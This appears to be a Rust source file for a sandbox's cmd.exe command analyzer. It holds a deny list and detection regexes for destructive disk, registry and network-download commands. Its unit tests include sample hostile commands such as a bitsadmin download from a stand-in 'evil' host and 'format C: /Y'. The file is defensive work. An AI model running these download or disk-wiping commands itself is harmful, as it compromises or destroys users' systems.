use regex::Regex;
use wf_types::script::sandbox::ShellPolicy;

use crate::command_policy::{CommandRule, Severity};

use super::base::{ShellAnalysisContext, ShellAnalysisResult, ShellAnalyzer, ShellType};

const SHELL_TYPE: ShellType = ShellType::Cmd;

/// Default cmd.exe blacklist, also used by the unified command policy.
pub(crate) const DENIED_COMMANDS: &[&str] = &[
    "format", "diskpart", "diskcomp", "diskcopy", "fdisk", "runas", "reg", "regedit", "regedt32",
    "regini", "net", "net1", "netsh", "bcdedit", "bootcfg", "bootsect", "wmic", "assoc", "ftype",
    "taskkill", "tskill",
];

/// Default cmd.exe dangerous rules (addressable ids + severity grades).
pub const DANGEROUS_PATTERNS: &[CommandRule] = &[
    CommandRule {
        id: "core.cmd:format-drive",
        pack: "core.filesystem",
        pattern: r"format\s+[A-Za-z]:",
        severity: Severity::Critical,
    },
    CommandRule {
        id: "core.cmd:format-root",
        pack: "core.filesystem",
        pattern: r"format\s+/",
        severity: Severity::Critical,
    },
    CommandRule {
        id: "core.cmd:diskpart-script",
        pack: "core.filesystem",
        pattern: r"diskpart\s+/s",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.cmd:disk-clean-all",
        pack: "core.filesystem",
        pattern: r"clean\s+all",
        severity: Severity::Critical,
    },
    CommandRule {
        id: "core.cmd:reg-import",
        pack: "core.registry",
        pattern: r"reg\s+import",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.cmd:reg-add",
        pack: "core.registry",
        pattern: r"reg\s+add",
        severity: Severity::Medium,
    },
    CommandRule {
        id: "core.cmd:reg-delete",
        pack: "core.registry",
        pattern: r"reg\s+delete",
        severity: Severity::Medium,
    },
    CommandRule {
        id: "core.cmd:wmic-process-delete",
        pack: "core.process",
        pattern: r"wmic\s+process\s+delete",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.cmd:wmic-path",
        pack: "core.process",
        pattern: r"wmic\s+path\s+",
        severity: Severity::Medium,
    },
    CommandRule {
        id: "core.cmd:net-share",
        pack: "core.network",
        pattern: r"net\s+share",
        severity: Severity::Medium,
    },
    CommandRule {
        id: "core.cmd:net-use",
        pack: "core.network",
        pattern: r"net\s+use",
        severity: Severity::Medium,
    },
    CommandRule {
        id: "core.cmd:psexec",
        pack: "core.process",
        pattern: r"psexec",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.cmd:winrm",
        pack: "core.network",
        pattern: r"winrm",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.cmd:bitsadmin-transfer",
        pack: "core.network",
        pattern: r"bitsadmin\s+/transfer",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.cmd:certutil-urlcache",
        pack: "core.network",
        pattern: r"certutil\s+-urlcache",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.cmd:certutil-decode",
        pack: "core.network",
        pattern: r"certutil\s+-decode",
        severity: Severity::Medium,
    },
    CommandRule {
        id: "core.cmd:cscript",
        pack: "core.process",
        pattern: r"cscript\s+",
        severity: Severity::Medium,
    },
    CommandRule {
        id: "core.cmd:mshta",
        pack: "core.process",
        pattern: r"mshta\s+",
        severity: Severity::High,
    },
    CommandRule {
        id: "core.cmd:powershell-invoke",
        pack: "core.scripting",
        pattern: r"powershell\s+",
        severity: Severity::Medium,
    },
    CommandRule {
        id: "core.cmd:pwsh-invoke",
        pack: "core.scripting",
        pattern: r"pwsh\s+",
        severity: Severity::Medium,
    },
];

pub struct CmdAnalyzer;

struct ResolvedShellPolicy {
    /// (regex, severity) pairs resolved from user patterns or the built-in
    /// rule table.
    dangerous_patterns: Vec<(String, Severity)>,
    allow_pipe: bool,
    allow_redirect: bool,
}

impl CmdAnalyzer {
    fn resolve_policy(&self, policy: &ShellPolicy) -> ResolvedShellPolicy {
        ResolvedShellPolicy {
            dangerous_patterns: policy
                .dangerous_patterns
                .clone()
                .unwrap_or_else(|| {
                    DANGEROUS_PATTERNS
                        .iter()
                        .map(|r| r.pattern.to_string())
                        .collect()
                })
                .into_iter()
                .map(|p| {
                    let sev = DANGEROUS_PATTERNS
                        .iter()
                        .find(|r| r.pattern == p)
                        .map(|r| r.severity)
                        .unwrap_or(Severity::High);
                    (p, sev)
                })
                .collect(),
            allow_pipe: policy.allow_pipe.unwrap_or(true),
            allow_redirect: policy.allow_redirect.unwrap_or(true),
        }
    }
}

impl ShellAnalyzer for CmdAnalyzer {
    fn shell_type(&self) -> ShellType {
        SHELL_TYPE
    }

    fn analyze(&self, ctx: &ShellAnalysisContext) -> ShellAnalysisResult {
        let policy = self.resolve_policy(ctx.policy);

        if ctx.command.trim().is_empty() {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Empty command".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        for (pattern, severity) in &policy.dangerous_patterns {
            // An invalid user-supplied pattern must deny, not silently
            // disable the rule (fail-closed).
            let re = match Regex::new(pattern) {
                Ok(re) => re,
                Err(e) => {
                    return ShellAnalysisResult {
                        allowed: false,
                        reason: Some(format!("Invalid dangerous pattern '{pattern}': {e}")),
                        command: ctx.command.to_string(),
                        shell_type: SHELL_TYPE,
                    };
                }
            };
            if re.is_match(ctx.command) {
                return ShellAnalysisResult {
                    allowed: false,
                    reason: Some(format!(
                        "Dangerous pattern detected [{severity}]: {pattern}"
                    )),
                    command: ctx.command.to_string(),
                    shell_type: SHELL_TYPE,
                };
            }
        }

        if !policy.allow_pipe && ctx.command.contains('|') {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Pipe operator is not allowed".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        if !policy.allow_redirect && (ctx.command.contains('<') || ctx.command.contains('>')) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Redirect operator is not allowed".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        ShellAnalysisResult {
            allowed: true,
            reason: None,
            command: ctx.command.to_string(),
            shell_type: SHELL_TYPE,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use wf_types::script::sandbox::ShellPolicy;

    fn empty_policy() -> ShellPolicy {
        ShellPolicy {
            allowed_commands: None,
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        }
    }

    fn analyzer() -> CmdAnalyzer {
        CmdAnalyzer
    }

    fn analyze(cmd: &str, policy: &ShellPolicy) -> ShellAnalysisResult {
        let tokens = shlex::split(cmd).unwrap_or_default();
        let ctx = ShellAnalysisContext {
            command: cmd,
            policy,
            tokens: &tokens,
        };
        analyzer().analyze(&ctx)
    }

    #[test]
    fn test_cmd_analyzer_shell_type() {
        assert_eq!(analyzer().shell_type(), ShellType::Cmd);
    }

    #[test]
    fn test_allows_safe() {
        let result = analyze("dir", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_denies_format() {
        let result = analyze("format C: /Y", &empty_policy());
        assert!(!result.allowed);
        assert!(result.reason.as_ref().unwrap().contains("format"));
    }

    #[test]
    fn test_denies_reg_import() {
        let result = analyze("reg import evil.reg", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_diskpart() {
        let result = analyze("diskpart /s script.txt", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_powershell_invoke() {
        let result = analyze("powershell -Command Invoke-Expression", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_bitsadmin() {
        let result = analyze(
            "bitsadmin /transfer job http://evil/file.exe C:\\out.exe",
            &empty_policy(),
        );
        assert!(!result.allowed);
    }

    #[test]
    fn test_at_prefix_stripped() {
        let result = analyze("@echo hello", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_start_wrapper_skipped() {
        let result = analyze("start /B dir", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_ext_command_with_path() {
        let result = analyze("C:\\Windows\\System32\\notepad.exe", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_empty_command() {
        let result = analyze("", &empty_policy());
        assert!(!result.allowed);
    }
}
